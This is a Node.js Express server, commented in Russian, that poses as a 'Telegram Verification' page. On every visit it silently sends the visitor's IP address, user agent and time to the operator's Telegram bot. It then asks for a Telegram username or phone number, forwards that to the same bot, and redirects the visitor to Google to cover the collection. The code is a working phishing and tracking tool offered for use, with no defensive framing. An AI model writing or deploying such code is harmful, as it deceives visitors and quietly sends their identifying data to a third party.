const express = require('express');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_BOT_TOKEN = process.env.TOKEN;
const TELEGRAM_CHAT_ID = process.env.CHAT_ID;

function sendToTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN) return;
  axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    chat_id: TELEGRAM_CHAT_ID,
    text: text
  }).catch(e => console.log(e.message));
}

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Главная страница — сбор IP и форма для username
app.get('/', (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const cleanIp = ip.replace('::ffff:', '');
  const ua = req.headers['user-agent'] || 'Unknown';
  const time = new Date().toLocaleString();

  // Отправляем IP в Telegram
  let msg = `📍 NEW VISIT\n`;
  msg += `🕒 Time: ${time}\n`;
  msg += `🌐 IP: ${cleanIp}\n`;
  msg += `💻 UA: ${ua.slice(0, 100)}\n`;
  sendToTelegram(msg);

  // Отдаём страницу с формой для username
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Telegram Verification</title>
      <style>
        body {
          font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
          background: #0f0f0f;
          color: white;
          display: flex;
          justify-content: center;
          align-items: center;
          height: 100vh;
          margin: 0;
          padding: 20px;
        }
        .card {
          background: #1f1f1f;
          border-radius: 28px;
          padding: 32px 24px;
          max-width: 400px;
          width: 100%;
          box-shadow: 0 8px 24px rgba(0,0,0,0.4);
          text-align: center;
        }
        .logo {
          margin-bottom: 24px;
        }
        .logo svg {
          width: 48px;
          height: 48px;
          fill: #2c7be5;
        }
        h2 {
          font-size: 24px;
          margin-bottom: 8px;
        }
        .sub {
          color: #888;
          font-size: 14px;
          margin-bottom: 28px;
        }
        input {
          width: 100%;
          padding: 14px 16px;
          background: #2a2a2a;
          border: none;
          border-radius: 14px;
          color: white;
          font-size: 16px;
          margin-bottom: 16px;
          outline: none;
          box-sizing: border-box;
        }
        button {
          width: 100%;
          padding: 14px;
          background: #2c7be5;
          border: none;
          border-radius: 14px;
          color: white;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
        }
        button:hover {
          background: #1a68d1;
        }
      </style>
    </head>
    <body>
      <div class="card">
        <div class="logo">
          <svg viewBox="0 0 24 24">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/>
          </svg>
        </div>
        <h2>Welcome</h2>
        <div class="sub">Please enter your Telegram username to continue</div>
        <form action="/submit" method="post">
          <input type="text" name="username" placeholder="@username or phone" required autocomplete="off">
          <button type="submit">Continue</button>
        </form>
      </div>
    </body>
    </html>
  `);
});

// Обработка отправленной формы
app.post('/submit', (req, res) => {
  const { username } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const cleanIp = ip.replace('::ffff:', '');
  const ua = req.headers['user-agent'] || 'Unknown';
  const time = new Date().toLocaleString();

  let msg = `👤 USERNAME COLLECTED\n`;
  msg += `🕒 Time: ${time}\n`;
  msg += `🌐 IP: ${cleanIp}\n`;
  msg += `👤 Username: ${username}\n`;
  msg += `💻 UA: ${ua.slice(0, 100)}`;
  sendToTelegram(msg);

  // После отправки — редирект на Google
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <title>Redirecting...</title>
      <style>
        body {
          background: #0f0f0f;
          color: white;
          display: flex;
          justify-content: center;
          align-items: center;
          height: 100vh;
          font-family: sans-serif;
        }
      </style>
    </head>
    <body>
      <div>Redirecting...</div>
      <script>
        setTimeout(() => {
          window.location.href = "https://google.com";
        }, 2000);
      </script>
    </body>
    </html>
  `);
});

app.listen(PORT, () => console.log(`Username logger running on port ${PORT}`));
